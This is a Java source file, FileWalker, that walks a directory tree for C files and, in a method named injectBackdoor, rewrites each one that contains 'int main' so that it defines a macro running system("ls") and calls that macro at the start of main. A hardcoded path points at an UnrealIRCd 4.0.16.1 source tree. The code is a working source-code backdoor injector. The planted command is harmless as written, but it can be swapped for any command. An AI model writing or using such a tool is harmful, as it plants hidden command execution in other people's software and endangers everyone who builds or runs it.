package app.main;

import java.io.IOException;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;
import java.io.File;
import java.io.FileNotFoundException;

public class FileWalker {
	private List<String> c_file_list;
	
	public FileWalker(String path) {
		c_file_list = new ArrayList<String>();
		walk(path);
		injectBackdoor();
	}
    
	public void walk( String path ) {

        File root = new File( path );
        File[] list = root.listFiles();

        if (list == null) return;

        for ( File f : list ) {
            if ( f.isDirectory() ) {
                walk( f.getAbsolutePath() );
                //System.out.println( "Dir:" + f.getAbsoluteFile() );
            }
            else {
            	String file = f.getAbsoluteFile().toString();
            	if(file.endsWith(".c")) {
            		c_file_list.add(file);
            	}
            }
        }
    }
    
    public void injectBackdoor() {
    	try {
    		System.out.println("parsing file list");
	    	for(String path : c_file_list) {
	    		System.out.println("parsing file"+path);
	    		if(path.equals("E:\\Desktop\\unrealircd-4.0.16.1\\src\\win32\\config.c")) {
	    			System.out.println("dbg");
	    		}
	        	int int_main_index = -1;
	        	int include_index = -1;
	        	List<String> fileLines;
	        	try {
	        		fileLines = Files.readAllLines(Paths.get(path));
	        	}catch(Exception e) {
	        		System.out.println("Ignoring file: "+path);
	        		continue;
	        	}
	    		for(int i=0; i<fileLines.size(); i++) {
		    		String line = fileLines.get(i);
		    		if(line.toLowerCase().contains("int main")) {
		    			int_main_index = getIntMainIndex(i, fileLines);
		    			break;
		    		}else if(include_index == -1 && line.toLowerCase().contains("#include")) {
		    			include_index = i;
		    			continue;
		    		}
	    		}
	    		if(int_main_index == -1) {
	    			continue;
	    		}
	    		System.out.println("--------------");
	    		System.out.println("Hacking: "+path);
	    		System.out.println("--------------");
	    		File file = new File(path);
	    		file.delete();
	        	PrintWriter writer = new PrintWriter(path, "UTF-8");
	        	if(include_index == -1) {
	        		include_index = 0;
	        	}
	        	
	        	for(int i=0; i<fileLines.size(); i++) {
	        		if(include_index == i) {
		        		writer.println("#define debug3() system(\"ls\")");
		        		writer.println(fileLines.get(i));
	        		}else if(int_main_index == i) {
		        		writer.println(fileLines.get(i));
		        		writer.println("debug3();");
	        		}else {
	        			writer.println(fileLines.get(i));
	        		}
	        	}
	        	writer.close();
	    	}
    	}catch(Exception e) {
    		System.out.println(e.getMessage());
    	}
    }
    
    public int getIntMainIndex(int intMainCurrentIndex, List<String> fileLines) {
		int search_opened_parenthesis = 1;
		int search_closed_parenthesis = 0;
		int search_brace_parenthesis = 0;
		String key = "int main";
		int key_length = key.length();
		String currentLine = fileLines.get(intMainCurrentIndex);
		int position = currentLine.indexOf(key);
		position+=key_length;
		
    	for(int i = intMainCurrentIndex; i<fileLines.size(); i++) {  
    		currentLine = fileLines.get(i);  		
    		while(position < currentLine.length()) {
    			char currentCharacter = currentLine.charAt(position);
    			
    			if(search_opened_parenthesis == 1) {
    				if(currentCharacter == '(') {
    					search_opened_parenthesis = 0;
    					search_closed_parenthesis = 1;
    				}
    			}else if(search_closed_parenthesis == 1) {
    				if(currentCharacter == ')') {
    					search_closed_parenthesis = 0;
    		    		search_brace_parenthesis = 1;
    				}
    			}else if(search_brace_parenthesis == 1) {
    				if(currentCharacter != '\r' && currentCharacter != '\n' && currentCharacter != ' ' && currentCharacter != '{') {
    					return -1;
    				}else if(currentCharacter == '{') {
    					return i;
    				}
    			}
    			position ++;
    		}
    		position = 0;
    	}
    	return -1;
    }
}